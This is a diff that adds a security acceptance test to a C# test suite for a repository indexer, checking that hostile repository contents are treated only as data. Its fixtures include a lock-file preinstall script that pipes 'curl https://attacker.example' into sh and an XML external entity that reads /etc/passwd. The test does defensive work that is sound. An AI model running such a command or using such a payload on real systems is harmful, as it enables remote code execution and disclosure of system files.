@@ -85,6 +85,37 @@ public sealed class IndexRepositoryTests(PostgresServer server)
     }
 
     [Fact]
+    public async Task A_prepared_repository_is_read_as_data_within_its_limits()
+    {
+        // Phase 2 acceptance: an oversized file, a lock file with install scripts and XML with an external entity.
+        var hooks = """
+            {"name":"evil","lockfileVersion":3,"packages":{
+              "":{"name":"evil","dependencies":{"left-pad":"1.3.0"},"scripts":{"preinstall":"curl https://attacker.example | sh"}},
+              "node_modules/left-pad":{"version":"1.3.0","hasInstallScript":true}}}
+            """;
+        var github = new ScriptedRepository();
+        github.Commit("a1",
+            ("package-lock.json", hooks),
+            ("big/package-lock.json", new string(' ', IndexRepository.MaxFileBytes + 1)),
+            ("src/App/App.csproj", """
+                <?xml version="1.0"?>
+                <!DOCTYPE p [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
+                <Project><PropertyGroup><TargetFramework>&x;</TargetFramework></PropertyGroup></Project>
+                """));
+        await using var host = await StartAsync(github);
+        var (client, orgId, projectId, linkId) = await LinkAsync(host);
+        using var _ = client;
+
+        await RunAsync(host, orgId, linkId);
+
+        // The package is listed, nothing ran; the oversized file was never fetched; the entity gave nothing.
+        Assert.Equal(["left-pad 1.3.0 runtime direct"], (await ComponentsAsync(host, projectId)).Select(c => c.Describe));
+        Assert.DoesNotContain("big/package-lock.json", github.Fetched);
+        Assert.Equal(0L, await host.ScalarAsync<long>("SELECT count(*) FROM assets.component_suggestion"));
+        Assert.Equal(0L, await host.ScalarAsync<long>("SELECT count(*) FROM assets.component WHERE custom_name LIKE '%root%' OR version LIKE '%root%'"));
+    }
+
+    [Fact]
     public async Task Three_days_of_failure_raise_repository_unavailable_once()
     {
         var github = new ScriptedRepository { Failure = RepositoryFailure.NotFound };
@@ -195,6 +226,8 @@ public sealed class IndexRepositoryTests(PostgresServer server)
 
         public int FileReads { get; private set; }
 
+        public List<string> Fetched { get; } = [];
+
         public void Commit(string sha, params (string Path, string Content)[] files) =>
             (_commits[sha], _head) = (files.ToDictionary(f => f.Path, f => f.Content), sha);
 
@@ -214,6 +247,7 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         public Task<RepositoryResult<byte[]>> GetFileAsync(RepositoryRef repository, string commitSha, string path, int maxBytes, CancellationToken cancellationToken)
         {
             FileReads++;
+            Fetched.Add(path);
             return Task.FromResult(RepositoryResult<byte[]>.Success(Encoding.UTF8.GetBytes(_commits[commitSha][path])));
         }
     }
